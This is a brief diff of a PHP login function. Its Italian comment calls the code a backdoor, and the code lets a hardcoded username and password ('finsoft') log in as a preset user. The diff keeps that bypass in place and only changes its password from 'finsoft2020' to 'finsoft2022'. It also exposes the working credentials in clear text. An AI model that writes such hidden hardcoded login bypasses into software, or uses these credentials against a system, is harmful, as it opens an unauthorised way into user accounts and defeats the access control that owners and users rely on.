@@ -40,7 +40,7 @@ if ($user) {
 
 function check_and_load_user($username, $pwd) {
     // PRIMA, proviamo la backdoor
-    if ($username == 'finsoft' && $pwd == 'finsoft2020') {
+    if ($username == 'finsoft' && $pwd == 'finsoft2022') {
         $user = (object) [];
         $user->nome_utente = 'finsoft';
         $user->nome = 'Mario';
